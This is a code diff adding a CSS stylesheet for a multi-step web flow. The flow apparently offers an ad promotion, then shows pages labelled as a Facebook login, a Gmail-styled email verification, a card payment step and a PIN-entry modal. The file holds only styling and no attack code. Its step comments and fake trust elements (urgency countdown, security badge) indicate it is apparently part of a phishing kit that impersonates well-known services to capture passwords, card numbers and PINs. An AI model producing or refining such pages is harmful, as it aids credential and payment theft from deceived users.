@@ -1,0 +1,1568 @@
+/* ==================== GLOBAL STYLES ==================== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.main-container {
+    max-width: 680px;
+    width: 100%;
+    background: white;
+    border-radius: 24px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    overflow: hidden;
+    animation: slideUp 0.5s ease;
+}
+
+@keyframes slideUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+/* ==================== HEADER ==================== */
+.app-header {
+    background: #667eea;
+    color: white;
+    padding: 20px 30px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid #5a67d8;
+}
+
+.header-logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.logo-icon {
+    background: white;
+    width: 40px;
+    height: 40px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    color: #667eea;
+}
+
+.header-logo span {
+    font-size: 22px;
+    font-weight: 600;
+}
+
+.header-badge {
+    background: #ffd700;
+    color: #1c1e21;
+    padding: 6px 16px;
+    border-radius: 20px;
+    font-weight: 600;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+}
+
+/* ==================== SIMPLE STEP INDICATOR ==================== */
+.progress-container {
+    padding: 15px 20px;
+    background: #f8f9fa;
+    border-bottom: 1px solid #e0e0e0;
+}
+
+.simple-step-indicator {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.current-step {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.current-step .circle {
+    width: 36px;
+    height: 36px;
+    background: #667eea;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-weight: bold;
+    font-size: 18px;
+    box-shadow: 0 2px 8px rgba(102,126,234,0.3);
+}
+
+.current-step-info h4 {
+    font-size: 16px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 2px;
+}
+
+.current-step-info p {
+    font-size: 13px;
+    color: #666;
+}
+
+.step-count {
+    font-size: 13px;
+    color: #999;
+    font-weight: 500;
+}
+
+/* Hide the old progress steps */
+.progress-steps {
+    display: none;
+}
+
+/* ==================== STEP CONTENT ==================== */
+.step-content {
+    display: none;
+    padding: 30px;
+}
+
+.step-content.active {
+    display: block;
+    animation: fadeIn 0.5s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+/* ==================== FORM ELEMENTS ==================== */
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 600;
+    color: #333;
+    font-size: 15px;
+}
+
+.form-control, 
+.form-group input,
+.form-group select,
+.form-group textarea {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 16px;
+    border: 2px solid #e0e0e0;
+    border-radius: 8px;
+    transition: all 0.3s;
+    background: white;
+}
+
+.form-control:focus,
+.form-group input:focus,
+.form-group select:focus,
+.form-group textarea:focus {
+    outline: none;
+    border-color: #667eea;
+    box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+}
+
+.row {
+    display: flex;
+    gap: 15px;
+}
+
+.row .form-group {
+    flex: 1;
+}
+
+/* ==================== BUTTONS ==================== */
+.btn {
+    width: 100%;
+    padding: 16px;
+    background: #667eea;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.btn:hover {
+    background: #5a67d8;
+    transform: translateY(-2px);
+    box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+}
+
+.btn-success {
+    background: #42b72a;
+}
+
+.btn-success:hover {
+    background: #36a420;
+}
+
+/* ==================== PASSWORD TOGGLE ==================== */
+.password-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.password-wrapper input {
+    padding-right: 45px !important;
+}
+
+.toggle-password {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #666;
+    font-size: 18px;
+    z-index: 2;
+    width: 30px;
+    height: 30px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+}
+
+.toggle-password:hover {
+    background-color: #f0f2f5;
+    color: #667eea;
+}
+
+/* ==================== MODERN PHOTO UPLOAD ==================== */
+.modern-upload {
+    border: 2px dashed #667eea;
+    border-radius: 12px;
+    padding: 25px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.3s;
+    background: #f8f9fa;
+    margin-bottom: 10px;
+}
+
+.modern-upload:hover {
+    background: #e7f3ff;
+    transform: translateY(-2px);
+    box-shadow: 0 8px 16px rgba(102,126,234,0.1);
+}
+
+.upload-icon-container {
+    width: 50px;
+    height: 50px;
+    background: #e7f3ff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 10px;
+}
+
+.upload-icon-container i {
+    color: #667eea;
+    font-size: 24px;
+}
+
+.upload-text {
+    color: #667eea;
+    font-weight: 600;
+    margin-bottom: 5px;
+}
+
+.upload-subtext {
+    color: #999;
+    font-size: 13px;
+}
+
+/* File Info Display */
+.file-info {
+    background: #f0f2f5;
+    border-radius: 10px;
+    padding: 12px 16px;
+    margin-top: 10px;
+    border: 1px solid #e0e0e0;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.file-icon {
+    width: 36px;
+    height: 36px;
+    background: #667eea;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.file-icon i {
+    color: white;
+    font-size: 18px;
+}
+
+.file-details {
+    flex: 1;
+}
+
+.file-name {
+    font-weight: 500;
+    color: #333;
+    font-size: 14px;
+    margin-bottom: 2px;
+    word-break: break-all;
+}
+
+.file-size {
+    font-size: 12px;
+    color: #666;
+}
+
+.remove-file {
+    background: none;
+    border: none;
+    color: #999;
+    cursor: pointer;
+    font-size: 20px;
+    padding: 5px;
+    transition: color 0.3s;
+}
+
+.remove-file:hover {
+    color: #f02849;
+}
+
+/* Hide old photo elements */
+.photo-upload-area {
+    display: none;
+}
+
+.photo-preview {
+    display: none;
+}
+
+/* ==================== CITY SECTION ==================== */
+.city-group {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 10px;
+}
+
+.city-group input {
+    flex: 1;
+}
+
+.add-city-btn {
+    background: #e7f3ff;
+    color: #667eea;
+    border: 1px dashed #667eea;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    width: 100%;
+    transition: all 0.3s;
+}
+
+.add-city-btn:hover {
+    background: #d4e6ff;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 8px rgba(102,126,234,0.2);
+}
+
+.remove-city {
+    background: #f02849;
+    color: white;
+    border: none;
+    padding: 12px 15px;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.3s;
+    font-size: 14px;
+}
+
+.remove-city:hover {
+    background: #d11a3a;
+    transform: scale(1.05);
+}
+
+/* ==================== CONTACT OPTIONS ==================== */
+.contact-group {
+    display: grid;
+    gap: 12px;
+}
+
+.contact-option {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    background: #f8f9fa;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+
+.contact-option:hover {
+    background: #e7f3ff;
+    transform: translateX(5px);
+}
+
+.contact-option input[type="checkbox"] {
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+    accent-color: #667eea;
+}
+
+.contact-option label {
+    cursor: pointer;
+    font-weight: 500;
+    font-size: 15px;
+}
+
+.contact-input {
+    margin-top: 10px;
+    display: none;
+    animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.contact-input.show {
+    display: block;
+}
+
+/* ==================== SUMMARY CARDS ==================== */
+.summary-card {
+    background: #f8f9fa;
+    border-radius: 16px;
+    padding: 20px;
+    margin-bottom: 20px;
+    border: 1px solid #e4e6eb;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+}
+
+.summary-item {
+    display: flex;
+    justify-content: space-between;
+    padding: 12px 0;
+    border-bottom: 1px solid #e0e0e0;
+    font-size: 15px;
+}
+
+.summary-item:last-child {
+    border-bottom: none;
+}
+
+.summary-label {
+    color: #666;
+    font-weight: 500;
+}
+
+.summary-value {
+    color: #333;
+    font-weight: 600;
+    text-align: right;
+    max-width: 60%;
+}
+
+/* ==================== REACH INFO ==================== */
+.reach-info {
+    background: #e7f3ff;
+    border-radius: 12px;
+    padding: 15px;
+    margin: 15px 0;
+    text-align: center;
+    border-left: 4px solid #667eea;
+}
+
+.reach-info p {
+    font-size: 15px;
+    margin-bottom: 5px;
+}
+
+.reach-number {
+    font-size: 28px;
+    font-weight: 700;
+    color: #667eea;
+}
+
+/* ==================== OFFER BANNER ==================== */
+.offer-banner {
+    background: linear-gradient(135deg, #42b72a 0%, #36a420 100%);
+    color: white;
+    padding: 25px 30px;
+    text-align: center;
+    border-radius: 12px;
+    margin-bottom: 25px;
+    position: relative;
+    overflow: hidden;
+}
+
+.offer-banner::before {
+    content: "🎉";
+    position: absolute;
+    left: -20px;
+    top: -20px;
+    font-size: 120px;
+    opacity: 0.1;
+    transform: rotate(-15deg);
+}
+
+.offer-banner::after {
+    content: "🎉";
+    position: absolute;
+    right: -20px;
+    bottom: -20px;
+    font-size: 120px;
+    opacity: 0.1;
+    transform: rotate(15deg);
+}
+
+.offer-banner .offer-title {
+    font-size: 34px;
+    font-weight: 700;
+    margin-bottom: 10px;
+    position: relative;
+    z-index: 1;
+}
+
+.offer-banner .offer-date {
+    font-size: 20px;
+    margin-bottom: 15px;
+    position: relative;
+    z-index: 1;
+}
+
+.offer-stats {
+    display: flex;
+    justify-content: center;
+    gap: 30px;
+    position: relative;
+    z-index: 1;
+}
+
+.stat-item {
+    text-align: center;
+}
+
+.stat-value {
+    font-size: 28px;
+    font-weight: 700;
+}
+
+.stat-label {
+    font-size: 14px;
+    opacity: 0.9;
+}
+
+/* ==================== COUNTDOWN ==================== */
+.countdown-container {
+    background: #e7f3ff;
+    padding: 15px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-left: 4px solid #667eea;
+    border-radius: 8px;
+    margin-bottom: 25px;
+}
+
+.countdown-text {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    color: #667eea;
+    font-weight: 600;
+    font-size: 15px;
+}
+
+.countdown-number {
+    background: #667eea;
+    color: white;
+    padding: 8px 16px;
+    border-radius: 30px;
+    font-weight: 600;
+    font-size: 14px;
+    box-shadow: 0 2px 8px rgba(102,126,234,0.3);
+}
+
+/* ==================== SECTION TITLES ==================== */
+.section-title {
+    font-size: 18px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-left: 4px solid #667eea;
+    padding-left: 12px;
+}
+
+.section-title i {
+    color: #667eea;
+    font-size: 20px;
+}
+
+/* ==================== MODALS ==================== */
+.modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.5);
+    justify-content: center;
+    align-items: flex-start;
+    overflow-y: auto;
+    padding: 20px 0;
+    z-index: 1000;
+    backdrop-filter: blur(5px);
+}
+
+.modal-content {
+    background: white;
+    border-radius: 20px;
+    padding: 30px;
+    max-width: 450px;
+    width: 90%;
+    max-height: 90vh;
+    overflow-y: auto;
+    margin: 20px auto;
+    animation: modalIn 0.3s;
+    position: relative;
+}
+
+@keyframes modalIn {
+    from { transform: translateY(-50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+.modal-icon {
+    font-size: 60px;
+    margin-bottom: 20px;
+}
+
+.modal h3 {
+    color: #333;
+    font-size: 24px;
+    margin-bottom: 15px;
+}
+
+.modal p {
+    color: #666;
+    margin-bottom: 20px;
+    line-height: 1.6;
+    font-size: 15px;
+}
+
+.modal-btn {
+    background: #667eea;
+    color: white;
+    border: none;
+    padding: 14px 25px;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    margin: 5px 0;
+    transition: all 0.3s;
+}
+
+.modal-btn:hover {
+    background: #5a67d8;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(102,126,234,0.3);
+}
+
+.modal-btn.secondary {
+    background: #f0f2f5;
+    color: #333;
+}
+
+.modal-btn.secondary:hover {
+    background: #e4e6eb;
+}
+
+.close-btn {
+    background: none;
+    border: none;
+    font-size: 28px;
+    cursor: pointer;
+    color: #666;
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    transition: all 0.3s;
+    position: absolute;
+    top: 15px;
+    right: 15px;
+}
+
+.close-btn:hover {
+    background: #f0f2f5;
+    color: #667eea;
+}
+
+/* ==================== LOADING ==================== */
+.loading-spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #667eea;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 20px auto;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.progress-bar {
+    width: 100%;
+    height: 4px;
+    background: #e0e0e0;
+    border-radius: 2px;
+    margin: 20px 0;
+    overflow: hidden;
+}
+
+.progress-fill {
+    height: 100%;
+    background: #667eea;
+    width: 0%;
+    transition: width 0.3s;
+}
+
+/* ==================== PIN INPUT ==================== */
+.pin-input {
+    letter-spacing: 8px;
+    font-size: 24px;
+    text-align: center;
+    font-weight: bold;
+    width: 100%;
+    padding: 15px;
+    border: 2px solid #e0e0e0;
+    border-radius: 12px;
+    margin-bottom: 20px;
+}
+
+.pin-input:focus {
+    outline: none;
+    border-color: #667eea;
+    box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+}
+
+/* ==================== ERROR MESSAGES ==================== */
+.error-message {
+    color: #f02849;
+    font-size: 13px;
+    margin-top: 5px;
+    display: none;
+}
+
+/* ==================== SUCCESS MESSAGE ==================== */
+.success-message {
+    background: #42b72a;
+    color: white;
+    padding: 12px;
+    border-radius: 8px;
+    text-align: center;
+    margin-bottom: 20px;
+    display: none;
+    font-size: 15px;
+}
+
+/* ==================== EXIT BUTTON ==================== */
+.exit-btn {
+    background: white;
+    color: #1c1e21;
+    border: 2px solid #dadde1;
+    padding: 16px 40px;
+    font-size: 18px;
+    font-weight: 600;
+    border-radius: 50px;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    gap: 12px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    transition: all 0.3s;
+}
+
+.exit-btn:hover {
+    background: #f0f2f5;
+    border-color: #667eea;
+    color: #667eea;
+    transform: translateY(-2px);
+    box-shadow: 0 8px 16px rgba(102,126,234,0.15);
+}
+
+/* ==================== CARD ICONS ==================== */
+.card-icons {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-bottom: 25px;
+    flex-wrap: wrap;
+}
+
+.card-icon {
+    height: 30px;
+    opacity: 0.5;
+    transition: opacity 0.3s;
+}
+
+.card-icon.active {
+    opacity: 1;
+}
+
+/* ==================== SECURITY BADGE ==================== */
+.security-badge {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #f0f2f5;
+    padding: 12px 15px;
+    border-radius: 10px;
+    margin: 20px 0;
+    font-size: 14px;
+    color: #4b4f56;
+}
+
+.security-badge i {
+    color: #42b72a;
+    font-size: 20px;
+}
+
+/* ==================== PREVIEW MODAL ==================== */
+#adPreview {
+    max-height: 50vh;
+    overflow-y: auto;
+    padding: 15px;
+    background: #f8f9fa;
+    border-radius: 12px;
+    margin: 15px 0;
+}
+
+#adPreview img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    margin-bottom: 15px;
+}
+
+#adPreview div {
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+/* ==================== DATE & TIME SELECTORS ==================== */
+.datetime-row {
+    display: flex;
+    gap: 15px;
+    margin-bottom: 15px;
+}
+
+.datetime-row .form-group {
+    flex: 1;
+}
+
+.time-selector {
+    display: flex;
+    gap: 10px;
+}
+
+.time-selector select {
+    flex: 1;
+    padding: 12px;
+    border: 2px solid #e0e0e0;
+    border-radius: 8px;
+    font-size: 15px;
+    background: white;
+}
+
+/* ==================== FOOTER ==================== */
+.app-footer {
+    background: #f8f9fa;
+    padding: 20px 30px;
+    border-top: 1px solid #e0e0e0;
+    text-align: center;
+    font-size: 13px;
+    color: #666;
+}
+
+.app-footer a {
+    color: #667eea;
+    text-decoration: none;
+    margin: 0 10px;
+    transition: all 0.3s;
+    font-size: 13px;
+}
+
+.app-footer a:hover {
+    text-decoration: underline;
+    color: #5a67d8;
+}
+
+/* ==================== UTILITY CLASSES ==================== */
+.text-center {
+    text-align: center;
+}
+
+.mt-20 {
+    margin-top: 20px;
+}
+
+.mb-20 {
+    margin-bottom: 20px;
+}
+
+.hidden {
+    display: none !important;
+}
+
+/* ==================== COMPREHENSIVE MOBILE RESPONSIVE (UNDER 600px) ==================== */
+@media (max-width: 600px) {
+    /* Header */
+    .app-header {
+        padding: 12px 15px;
+        flex-direction: row;
+        flex-wrap: wrap;
+    }
+    
+    .header-logo {
+        gap: 8px;
+    }
+    
+    .header-logo span {
+        font-size: 16px;
+    }
+    
+    .logo-icon {
+        width: 32px;
+        height: 32px;
+        font-size: 18px;
+    }
+    
+    .header-badge {
+        padding: 4px 10px;
+        font-size: 10px;
+    }
+    
+    /* Simple Step Indicator - Mobile */
+    .progress-container {
+        padding: 12px 15px;
+    }
+    
+    .simple-step-indicator {
+        flex-direction: row;
+        align-items: center;
+    }
+    
+    .current-step {
+        gap: 8px;
+    }
+    
+    .current-step .circle {
+        width: 28px;
+        height: 28px;
+        font-size: 14px;
+    }
+    
+    .current-step-info h4 {
+        font-size: 13px;
+        margin-bottom: 0;
+    }
+    
+    .current-step-info p {
+        font-size: 10px;
+    }
+    
+    .step-count {
+        font-size: 10px;
+    }
+    
+    /* Step Content */
+    .step-content {
+        padding: 15px;
+    }
+    
+    /* Form Elements - ALL steps */
+    .form-group {
+        margin-bottom: 12px;
+    }
+    
+    .form-group label {
+        font-size: 13px;
+        margin-bottom: 4px;
+    }
+    
+    .form-control, 
+    .form-group input,
+    .form-group select,
+    .form-group textarea {
+        padding: 10px 12px;
+        font-size: 14px;
+    }
+    
+    /* Buttons - ALL steps */
+    .btn {
+        padding: 12px;
+        font-size: 15px;
+    }
+    
+    /* Row layout - stack on mobile */
+    .row {
+        flex-direction: column;
+        gap: 12px;
+    }
+    
+    .row .form-group {
+        width: 100%;
+    }
+    
+    /* Section Titles */
+    .section-title {
+        font-size: 15px;
+        margin-bottom: 10px;
+        padding-left: 8px;
+    }
+    
+    .section-title i {
+        font-size: 16px;
+    }
+    
+    /* Photo Upload - Step 1 */
+    .modern-upload {
+        padding: 15px;
+    }
+    
+    .upload-icon-container {
+        width: 40px;
+        height: 40px;
+    }
+    
+    .upload-icon-container i {
+        font-size: 20px;
+    }
+    
+    .upload-text {
+        font-size: 13px;
+    }
+    
+    .upload-subtext {
+        font-size: 11px;
+    }
+    
+    .file-info {
+        padding: 10px 12px;
+    }
+    
+    .file-icon {
+        width: 32px;
+        height: 32px;
+    }
+    
+    .file-icon i {
+        font-size: 16px;
+    }
+    
+    .file-name {
+        font-size: 12px;
+    }
+    
+    .file-size {
+        font-size: 10px;
+    }
+    
+    /* City Section - Step 1 */
+    .city-group {
+        gap: 8px;
+    }
+    
+    .add-city-btn {
+        padding: 10px;
+        font-size: 13px;
+    }
+    
+    .remove-city {
+        padding: 8px 12px;
+        font-size: 12px;
+    }
+    
+    /* Contact Options - Step 1 */
+    .contact-group {
+        gap: 10px;
+    }
+    
+    .contact-option {
+        padding: 10px 12px;
+    }
+    
+    .contact-option label {
+        font-size: 13px;
+    }
+    
+    .contact-option input[type="checkbox"] {
+        width: 18px;
+        height: 18px;
+    }
+    
+    /* Offer Banner - Step 1 */
+    .offer-banner {
+        padding: 15px;
+        margin-bottom: 15px;
+    }
+    
+    .offer-banner .offer-title {
+        font-size: 22px;
+    }
+    
+    .offer-banner .offer-date {
+        font-size: 14px;
+        margin-bottom: 10px;
+    }
+    
+    .offer-stats {
+        gap: 15px;
+        flex-wrap: wrap;
+    }
+    
+    .stat-value {
+        font-size: 20px;
+    }
+    
+    .stat-label {
+        font-size: 11px;
+    }
+    
+    /* Countdown - Step 1 */
+    .countdown-container {
+        padding: 12px 15px;
+        margin-bottom: 15px;
+        flex-direction: column;
+        gap: 8px;
+        align-items: flex-start;
+    }
+    
+    .countdown-text {
+        font-size: 13px;
+    }
+    
+    .countdown-number {
+        padding: 5px 12px;
+        font-size: 12px;
+        align-self: flex-end;
+    }
+    
+    /* Date & Time - Step 1 */
+    .datetime-row {
+        flex-direction: column;
+        gap: 10px;
+    }
+    
+    .time-selector select {
+        padding: 10px;
+        font-size: 13px;
+    }
+    
+    /* Facebook Login - Step 2 */
+    .password-wrapper input {
+        padding-right: 40px !important;
+    }
+    
+    .toggle-password {
+        width: 24px;
+        height: 24px;
+        font-size: 14px;
+        right: 8px;
+    }
+    
+    /* Email Verify - Step 3 */
+    .gmail-header {
+        padding: 15px;
+    }
+    
+    .gmail-logo span {
+        font-size: 20px;
+    }
+    
+    .gmail-header h1 {
+        font-size: 22px;
+    }
+    
+    .gmail-header p {
+        font-size: 13px;
+    }
+    
+    .verify-badge {
+        font-size: 12px;
+        padding: 5px 12px;
+    }
+    
+    .default-email {
+        padding: 12px;
+    }
+    
+    .default-email-icon {
+        width: 32px;
+        height: 32px;
+        font-size: 16px;
+    }
+    
+    .default-email-info .email {
+        font-size: 13px;
+    }
+    
+    .default-email-info .note {
+        font-size: 11px;
+    }
+    
+    .options {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+        margin: 15px 0;
+    }
+    
+    .checkbox {
+        font-size: 13px;
+    }
+    
+    .help-link {
+        font-size: 13px;
+    }
+    
+    .gmail-footer {
+        flex-direction: column;
+        gap: 12px;
+        padding: 15px;
+    }
+    
+    .language-select {
+        width: 100%;
+        font-size: 12px;
+    }
+    
+    .footer-links {
+        gap: 15px;
+    }
+    
+    .footer-links a {
+        font-size: 11px;
+    }
+    
+    /* Payment - Step 4 */
+    .payment-header {
+        padding: 15px;
+    }
+    
+    .payment-header h2 {
+        font-size: 22px;
+    }
+    
+    .payment-header .amount {
+        font-size: 36px;
+    }
+    
+    .payment-header .amount small {
+        font-size: 18px;
+    }
+    
+    .payment-header .description {
+        font-size: 13px;
+    }
+    
+    .card-icons {
+        gap: 5px;
+        margin-bottom: 15px;
+    }
+    
+    .card-icon {
+        height: 20px;
+    }
+    
+    .security-badge {
+        padding: 10px;
+        font-size: 12px;
+        flex-direction: column;
+        text-align: center;
+        gap: 5px;
+    }
+    
+    .security-badge i {
+        font-size: 18px;
+    }
+    
+    /* Summary Cards - All steps */
+    .summary-card {
+        padding: 15px;
+    }
+    
+    .summary-item {
+        padding: 8px 0;
+        font-size: 13px;
+        flex-direction: column;
+        gap: 3px;
+    }
+    
+    .summary-label {
+        font-size: 12px;
+    }
+    
+    .summary-value {
+        font-size: 13px;
+        text-align: left;
+        max-width: 100%;
+    }
+    
+    /* Reach Info - Step 4 */
+    .reach-info {
+        padding: 12px;
+    }
+    
+    .reach-info p {
+        font-size: 12px;
+    }
+    
+    .reach-number {
+        font-size: 22px;
+    }
+    
+    /* PIN Input - Modal */
+    .pin-input {
+        font-size: 18px;
+        letter-spacing: 4px;
+        padding: 12px;
+    }
+    
+    /* Modals - All */
+    .modal-content {
+        padding: 20px;
+        width: 95%;
+    }
+    
+    .modal h3 {
+        font-size: 18px;
+        margin-bottom: 10px;
+    }
+    
+    .modal p {
+        font-size: 13px;
+        margin-bottom: 15px;
+    }
+    
+    .modal-icon {
+        font-size: 40px;
+        margin-bottom: 15px;
+    }
+    
+    .modal-btn {
+        padding: 12px;
+        font-size: 14px;
+    }
+    
+    .close-btn {
+        width: 32px;
+        height: 32px;
+        font-size: 22px;
+        top: 10px;
+        right: 10px;
+    }
+    
+    /* Loading Spinner */
+    .loading-spinner {
+        width: 40px;
+        height: 40px;
+        border-width: 4px;
+    }
+    
+    /* Thank You - Step 5 */
+    .success-header {
+        padding: 25px 20px;
+    }
+    
+    .success-icon {
+        font-size: 50px;
+    }
+    
+    .success-header h1 {
+        font-size: 28px;
+    }
+    
+    .success-header p {
+        font-size: 14px;
+    }
+    
+    .date-highlight {
+        padding: 15px;
+    }
+    
+    .date-highlight .date {
+        font-size: 20px;
+    }
+    
+    .date-highlight .time {
+        font-size: 14px;
+    }
+    
+    .status-badge {
+        font-size: 13px;
+        padding: 6px 15px;
+    }
+    
+    .info-box {
+        padding: 15px;
+    }
+    
+    .info-box p {
+        font-size: 13px;
+    }
+    
+    /* Exit Button - Step 5 */
+    .exit-btn {
+        padding: 12px 25px;
+        font-size: 14px;
+        gap: 8px;
+        width: 100%;
+        justify-content: center;
+    }
+    
+    /* Footer - All steps */
+    .app-footer {
+        padding: 15px;
+        font-size: 11px;
+    }
+    
+    .app-footer a {
+        font-size: 11px;
+        margin: 0 5px;
+    }
+    
+    /* Preview Modal */
+    #adPreview {
+        padding: 10px;
+        font-size: 13px;
+    }
+    
+    #adPreview div {
+        font-size: 12px;
+    }
+    
+    /* Small text elements everywhere */
+    small, .small-text, .hint, .note, .text-muted {
+        font-size: 10px !important;
+    }
+    
+    /* Headers scaling */
+    h1 {
+        font-size: 24px;
+    }
+    
+    h2 {
+        font-size: 20px;
+    }
+    
+    h3 {
+        font-size: 16px;
+    }
+    
+    h4 {
+        font-size: 14px;
+    }
+    
+    /* Form help text */
+    .form-text, .help-text {
+        font-size: 11px;
+    }
+}
+
+/* Extra small devices (under 400px) */
+@media (max-width: 400px) {
+    .step-content {
+        padding: 12px;
+    }
+    
+    .current-step .circle {
+        width: 24px;
+        height: 24px;
+        font-size: 12px;
+    }
+    
+    .current-step-info h4 {
+        font-size: 12px;
+    }
+    
+    .current-step-info p {
+        font-size: 9px;
+    }
+    
+    .btn {
+        padding: 10px;
+        font-size: 14px;
+    }
+    
+    .form-control, 
+    .form-group input,
+    .form-group select,
+    .form-group textarea {
+        padding: 8px 10px;
+        font-size: 13px;
+    }
+    
+    .offer-banner .offer-title {
+        font-size: 20px;
+    }
+    
+    .stat-value {
+        font-size: 18px;
+    }
+    
+    .modal-content {
+        padding: 15px;
+    }
+    
+    .card-icon {
+        height: 18px;
+    }
+}
